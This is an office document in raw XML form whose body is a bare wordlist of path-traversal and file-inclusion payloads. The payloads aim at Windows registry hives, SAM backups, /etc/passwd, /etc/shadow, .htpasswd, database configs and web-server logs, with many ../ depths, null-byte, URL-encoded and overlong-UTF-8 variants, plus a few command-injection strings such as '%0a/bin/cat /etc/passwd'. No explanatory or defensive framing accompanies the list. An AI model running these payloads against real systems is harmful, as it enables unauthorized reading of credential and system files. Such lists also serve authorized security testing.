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4367"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties officeooo:paragraph-rsid="001f6712"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="001f67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C:/Users/Administrator/NTUser.dat</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Documents and Settings/Administrator/NTUser.dat</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/apache/logs/access.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/apache/logs/error.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/apache/php/php.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/boot.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/inetpub/wwwroot/global.asa</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/MySQL/data/hostname.err</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/MySQL/data/mysql.err</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/MySQL/data/mysql.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/MySQL/my.cnf</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/MySQL/my.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/php4/php.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/php5/php.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/php/php.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Program Files/Apache Group/Apache2/conf/httpd.conf</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Program Files/Apache Group/Apache/conf/httpd.conf</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Program Files/Apache Group/Apache/logs/access.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Program Files/Apache Group/Apache/logs/error.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Program Files/FileZilla Server/FileZilla Server.xml</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Program Files/MySQL/data/hostname.err</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Program Files/MySQL/data/mysql-bin.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Program Files/MySQL/data/mysql.err</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Program Files/MySQL/data/mysql.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Program Files/MySQL/my.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Program Files/MySQL/my.cnf</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Program Files/MySQL/MySQL Server 5.0/my.cnf</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Program Files/MySQL/MySQL Server 5.0/my.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Program Files (x86)/Apache Group/Apache/conf/access.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Program Files (x86)/Apache Group/Apache/conf/error.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Program Files (x86)/xampp/apache/conf/httpd.conf</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/WINDOWS/php.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/WINDOWS/Repair/SAM</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Windows/repair/system</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Windows/repair/software</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Windows/repair/security</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/WINDOWS/System32/drivers/etc/hosts</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Windows/win.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/WINNT/php.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/WINNT/win.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/xampp/apache/bin/php.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/xampp/apache/logs/access.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/xampp/apache/logs/error.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Windows/Panther/Unattend/Unattended.xml</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Windows/Panther/Unattended.xml</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Windows/debug/NetSetup.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Windows/system32/config/AppEvent.Evt</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Windows/system32/config/SecEvent.Evt</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Windows/system32/config/default.sav</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Windows/system32/config/security.sav</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Windows/system32/config/software.sav</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>C:/Windows/system32/config/system.sav</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Windows/system32/config/regback/default</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Windows/system32/config/regback/sam</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Windows/system32/config/regback/security</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Windows/system32/config/regback/system</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Windows/system32/config/regback/software</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Program Files/MySQL/MySQL Server 5.1/my.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml</text:p>
      <text:p text:style-name="Preformatted_20_Text">C:/Windows/System32/inetsrv/config/applicationHost.config</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:a xlink:type="simple" xlink:href="../../../../C:/inetpub/logs/LogFiles/W3SVC1/u_ex%5BYYMMDD%5D.log" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log</text:a></text:p>
      <text:p text:style-name="P1">C:/inetpub/wwwroot/global.asa</text:p>
      <text:p text:style-name="P1">C:\inetpub\wwwroot\global.asa</text:p>
      <text:p text:style-name="P1">C:/boot.ini</text:p>
      <text:p text:style-name="P1"><text:a xlink:type="simple" xlink:href="../../../../C:/boot.ini" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">C:\boot.ini</text:a></text:p>
      <text:p text:style-name="P1">d:\AppServ\MySQL</text:p>
      <text:p text:style-name="P1">c:\AppServ\MySQL</text:p>
      <text:p text:style-name="P1">c:WINDOWS/system32/</text:p>
      <text:p text:style-name="P1">/C:\Program Files\</text:p>
      <text:p text:style-name="P1">/D:\Program Files\</text:p>
      <text:p text:style-name="P1">/C:/inetpub/ftproot/</text:p>
      <text:p text:style-name="Preformatted_20_Text">/etc/master.passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">/master.passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">etc/shadow%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">/etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">/etc/passwd%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../etc/passwd</text:p>
      <text:p text:style-name="P2">../e%00t%00c/passwd%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../etc/passwd%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../etc/passwd%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../etc/passwd%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../etc/passwd%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../etc/passwd%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../etc/passwd%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../etc/passwd%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../etc/passwd%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../etc/passwd%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../etc/passwd%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../etc/passwd%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../../etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../../etc/passwd%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../../../etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../../../etc/passwd%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../../../../etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../../../../etc/passwd%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../../../../../etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../../../../../etc/passwd%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../../../../../../etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>../../../../../../../../../../../../../../../../../etc/passwd%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../../../../../../../etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../../../../../../../etc/passwd%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../../../../../../../../etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../../../../../../../../etc/passwd%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../../../../../../../../../etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../../../../../../../../../etc/passwd%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../../../../../../../../../../etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../../../../../../../../../../etc/passwd%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../../../../../../../../../../../etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../../../../../../../../../../../etc/shadow%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../etc/passwd&amp;=%3C%3C%3C%3C</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../administrator/inbox</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../dev</text:p>
      <text:p text:style-name="Preformatted_20_Text">.htpasswd</text:p>
      <text:p text:style-name="Preformatted_20_Text">passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">passwd.dat</text:p>
      <text:p text:style-name="Preformatted_20_Text">pass.dat</text:p>
      <text:p text:style-name="Preformatted_20_Text">.htpasswd</text:p>
      <text:p text:style-name="Preformatted_20_Text">/.htpasswd</text:p>
      <text:p text:style-name="Preformatted_20_Text">../.htpasswd</text:p>
      <text:p text:style-name="Preformatted_20_Text">.passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">/.passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">../.passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">.pass</text:p>
      <text:p text:style-name="Preformatted_20_Text">../.pass</text:p>
      <text:p text:style-name="Preformatted_20_Text">members/.htpasswd</text:p>
      <text:p text:style-name="Preformatted_20_Text">member/.htpasswd</text:p>
      <text:p text:style-name="Preformatted_20_Text">user/.htpasswd</text:p>
      <text:p text:style-name="Preformatted_20_Text">users/.htpasswd</text:p>
      <text:p text:style-name="Preformatted_20_Text">root/.htpasswd</text:p>
      <text:p text:style-name="Preformatted_20_Text">db.php</text:p>
      <text:p text:style-name="Preformatted_20_Text">data.php</text:p>
      <text:p text:style-name="Preformatted_20_Text">database.asp</text:p>
      <text:p text:style-name="Preformatted_20_Text">database.js</text:p>
      <text:p text:style-name="Preformatted_20_Text">database.php</text:p>
      <text:p text:style-name="Preformatted_20_Text">dbase.php a</text:p>
      <text:p text:style-name="Preformatted_20_Text">admin/access_log</text:p>
      <text:p text:style-name="Preformatted_20_Text">../users.db.php</text:p>
      <text:p text:style-name="Preformatted_20_Text">users.db.php</text:p>
      <text:p text:style-name="Preformatted_20_Text">/core/config.php</text:p>
      <text:p text:style-name="Preformatted_20_Text">config.php</text:p>
      <text:p text:style-name="Preformatted_20_Text">config.js</text:p>
      <text:p text:style-name="Preformatted_20_Text">../config.js</text:p>
      <text:p text:style-name="Preformatted_20_Text">config.asp</text:p>
      <text:p text:style-name="Preformatted_20_Text">../config.asp</text:p>
      <text:p text:style-name="Preformatted_20_Text">_config.php</text:p>
      <text:p text:style-name="Preformatted_20_Text">../_config.php</text:p>
      <text:p text:style-name="Preformatted_20_Text">../_config.php%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../config.php</text:p>
      <text:p text:style-name="Preformatted_20_Text">config.inc.php</text:p>
      <text:p text:style-name="Preformatted_20_Text">../config.inc.php</text:p>
      <text:p text:style-name="Preformatted_20_Text">/config.asp</text:p>
      <text:p text:style-name="Preformatted_20_Text">../config.asp</text:p>
      <text:p text:style-name="Preformatted_20_Text">/../../../../pswd</text:p>
      <text:p text:style-name="Preformatted_20_Text">/admin/install.php</text:p>
      <text:p text:style-name="Preformatted_20_Text">../install.php</text:p>
      <text:p text:style-name="Preformatted_20_Text">install.php</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd</text:p>
      <text:p text:style-name="Preformatted_20_Text">..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow</text:p>
      <text:p text:style-name="Preformatted_20_Text">..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow</text:p>
      <text:p text:style-name="Preformatted_20_Text">..%2F..%2F..%2F%2F..%2F..%2F%2Fvar%2Fnamed</text:p>
      <text:p text:style-name="Preformatted_20_Text">..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">/..\..\..\..\..\..\winnt\win.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../windows/win.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">..//..//..//..//..//boot.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">..\../..\../boot.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">..\../..\../..\../..\../boot.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">\…..\\\…..\\\…..\\\</text:p>
      <text:p text:style-name="Preformatted_20_Text">=3D “/..” . “%2f..</text:p>
      <text:p text:style-name="Preformatted_20_Text">/boot/grub/grub.conf</text:p>
      <text:p text:style-name="Preformatted_20_Text">/proc/interrupts</text:p>
      <text:p text:style-name="Preformatted_20_Text">/proc/cpuinfo</text:p>
      <text:p text:style-name="Preformatted_20_Text">/proc/meminfo</text:p>
      <text:p text:style-name="Preformatted_20_Text">../apache/logs/error.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">../apache/logs/access.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../apache/logs/error.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../apache/logs/access.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../apache/logs/error.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../apache/logs/access.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../etc/httpd/logs/acces_log</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../etc/httpd/logs/acces.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../etc/httpd/logs/error_log</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../etc/httpd/logs/error.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../var/www/logs/access_log</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../var/www/logs/access.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../usr/local/apache/logs/access_ log</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../usr/local/apache/logs/access. log</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../var/log/apache/access_log</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../var/log/apache2/access_log</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../var/log/apache/access.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../var/log/apache2/access.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../var/log/access_log</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../var/log/access.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../var/www/logs/error_log</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../var/www/logs/error.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../usr/local/apache/logs/error_l og</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../usr/local/apache/logs/error.l og</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../var/log/apache/error_log</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../var/log/apache2/error_log</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../var/log/apache/error.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../var/log/apache2/error.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../var/log/error_log</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../var/log/error.log</text:p>
      <text:p text:style-name="Preformatted_20_Text">/etc/init.d/apache</text:p>
      <text:p text:style-name="Preformatted_20_Text">/etc/init.d/apache2</text:p>
      <text:p text:style-name="Preformatted_20_Text">/etc/httpd/httpd.conf</text:p>
      <text:p text:style-name="Preformatted_20_Text">/etc/apache/apache.conf</text:p>
      <text:p text:style-name="Preformatted_20_Text">/etc/apache/httpd.conf</text:p>
      <text:p text:style-name="Preformatted_20_Text">/etc/apache2/apache2.conf</text:p>
      <text:p text:style-name="Preformatted_20_Text">/etc/apache2/httpd.conf</text:p>
      <text:p text:style-name="Preformatted_20_Text">/usr/local/apache2/conf/httpd.conf</text:p>
      <text:p text:style-name="Preformatted_20_Text">/usr/local/apache/conf/httpd.conf</text:p>
      <text:p text:style-name="Preformatted_20_Text">/opt/apache/conf/httpd.conf</text:p>
      <text:p text:style-name="Preformatted_20_Text">/home/apache/httpd.conf</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>/home/apache/conf/httpd.conf</text:p>
      <text:p text:style-name="Preformatted_20_Text">/etc/apache2/sites-available/default</text:p>
      <text:p text:style-name="Preformatted_20_Text">/etc/apache2/vhosts.d/default_vhost.include</text:p>
      <text:p text:style-name="Preformatted_20_Text">/etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">/etc/shadow</text:p>
      <text:p text:style-name="Preformatted_20_Text">/etc/group</text:p>
      <text:p text:style-name="Preformatted_20_Text">/etc/security/group</text:p>
      <text:p text:style-name="Preformatted_20_Text">/etc/security/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">/etc/security/user</text:p>
      <text:p text:style-name="Preformatted_20_Text">/etc/security/environ</text:p>
      <text:p text:style-name="Preformatted_20_Text">/etc/security/limits</text:p>
      <text:p text:style-name="Preformatted_20_Text">/usr/lib/security/mkuser.default</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../etc/hosts%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../etc/hosts</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../boot.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">/../../../../../../../../%2A</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../etc/passwd%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../etc/shadow%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../etc/shadow</text:p>
      <text:p text:style-name="Preformatted_20_Text">/../../../../../../../../../../etc/passwd^^</text:p>
      <text:p text:style-name="Preformatted_20_Text">/../../../../../../../../../../etc/shadow^^</text:p>
      <text:p text:style-name="Preformatted_20_Text">/../../../../../../../../../../etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">/../../../../../../../../../../etc/shadow</text:p>
      <text:p text:style-name="Preformatted_20_Text">/./././././././././././etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">/./././././././././././etc/shadow</text:p>
      <text:p text:style-name="Preformatted_20_Text">\..\..\..\..\..\..\..\..\..\..\etc\passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">\..\..\..\..\..\..\..\..\..\..\etc\shadow</text:p>
      <text:p text:style-name="Preformatted_20_Text">..\..\..\..\..\..\..\..\..\..\etc\passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">..\..\..\..\..\..\..\..\..\..\etc\shadow</text:p>
      <text:p text:style-name="Preformatted_20_Text">/..\../..\../..\../..\../..\../..\../etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">/..\../..\../..\../..\../..\../..\../etc/shadow</text:p>
      <text:p text:style-name="Preformatted_20_Text">.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow</text:p>
      <text:p text:style-name="Preformatted_20_Text">\..\..\..\..\..\..\..\..\..\..\etc\passwd%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">\..\..\..\..\..\..\..\..\..\..\etc\shadow%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">..\..\..\..\..\..\..\..\..\..\etc\passwd%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">..\..\..\..\..\..\..\..\..\..\etc\shadow%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">%0a/bin/cat%20/etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">%0a/bin/cat%20/etc/shadow</text:p>
      <text:p text:style-name="Preformatted_20_Text">%00/etc/passwd%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">%00/etc/shadow%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">%00../../../../../../etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">%00../../../../../../etc/shadow</text:p>
      <text:p text:style-name="Preformatted_20_Text">/../../../../../../../../../../../etc/passwd%00.jpg</text:p>
      <text:p text:style-name="Preformatted_20_Text">/../../../../../../../../../../../etc/passwd%00.html</text:p>
      <text:p text:style-name="Preformatted_20_Text">/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow</text:p>
      <text:p text:style-name="Preformatted_20_Text">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow</text:p>
      <text:p text:style-name="Preformatted_20_Text">%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%<text:tab/>25%5c..%25%5c..%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%<text:tab/><text:tab/>25%5c..%25%5c..%255cboot.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..<text:soft-page-break/>%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">\\&amp;apos;/bin/cat%20/etc/passwd\\&amp;apos;</text:p>
      <text:p text:style-name="Preformatted_20_Text">\\&amp;apos;/bin/cat%20/etc/shadow\\&amp;apos;</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../conf/server.xml</text:p>
      <text:p text:style-name="Preformatted_20_Text">/../../../../../../../../bin/id|</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../localstart.asp%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../localstart.asp</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../boot.ini%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">../../../../../../../../../../../../boot.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">/./././././././././././boot.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">/../../../../../../../../../../../boot.ini%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">/../../../../../../../../../../../boot.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">/..\../..\../..\../..\../..\../..\../boot.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">\..\..\..\..\..\..\..\..\..\..\boot.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">..\..\..\..\..\..\..\..\..\..\boot.ini%00</text:p>
      <text:p text:style-name="Preformatted_20_Text">..\..\..\..\..\..\..\..\..\..\boot.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">/../../../../../../../../../../../boot.ini%00.html</text:p>
      <text:p text:style-name="Preformatted_20_Text">/../../../../../../../../../../../boot.ini%00.jpg</text:p>
      <text:p text:style-name="Preformatted_20_Text">/.../.../.../.../.../</text:p>
      <text:p text:style-name="Preformatted_20_Text">..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini</text:p>
      <text:p text:style-name="Preformatted_20_Text">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.i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21:49:24.667866889</dc:date>
    <meta:editing-duration>PT14M9S</meta:editing-duration>
    <meta:editing-cycles>2</meta:editing-cycles>
    <meta:generator>LibreOffice/7.4.1.2$Linux_X86_64 LibreOffice_project/3c58a8f3a960df8bc8fd77b461821e42c061c5f0</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="6" meta:paragraph-count="311" meta:word-count="381" meta:character-count="11062" meta:non-whitespace-character-count="10991"/>
